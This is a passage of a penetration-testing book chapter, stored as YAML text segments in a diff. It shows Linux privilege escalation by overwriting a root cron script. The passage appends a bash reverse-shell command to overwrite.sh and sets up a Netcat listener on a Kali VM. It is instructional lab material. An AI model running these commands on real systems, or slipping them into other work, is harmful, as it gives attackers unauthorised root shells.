+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Now, let''s add a **bash** command that will provide us with a reverse shell
+    to the **overwrite.sh** script. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" >> /usr/local/bin/overwrite.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will append a **bash** command that will connect to our reverse
+    listener on the Kali Linux VM. Ensure that you replace the fields in the command
+    with the respective IP address and port number.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After running the preceding command, the **overwrite.sh** script should contain
+    the command outlined in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.22 – The overwrite.sh script''s appended command'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_022.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.22 – The overwrite.sh script's appended command
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Once we have appended the **bash** command, we will need to set up a reverse
+    listener with Netcat.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can set up the reverse listener on the Kali VM by running the following
+    command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**nc -nvlp <PORT>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Ensure that you specify the port that you used in the **overwrite.sh** script.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After appending the **bash** command to the **overwrite.sh** script, we will
+    need to wait for a few minutes for the cron job to be invoked, after which we
+    should receive an elevated reverse shell on our Netcat listener, as highlighted
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.23 – Reverse shell'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_023.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.23 – Reverse shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we have successfully elevated our privileges by exploiting cron jobs
+    that run scripts with misconfigured permissions to execute a reverse shell payload
+    as the root user.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You should now have a firm grasp of how to enumerate the cron jobs running on
+    a system, as well as how to exploit them through various techniques to elevate
+    your privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we started by looking at how the cron utility works and the
+    structure of the crontab file. We then took an in-depth look at how to exploit
+    misconfigured cron paths. We also explored the process of exploiting wildcards
+    in scripts executed by cron jobs to elevate our privileges. Finally, we ended
+    this chapter by looking at how to elevate our privileges through cron file overwrites.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will look at how to exploit SUDO and SUID binaries to
+    elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
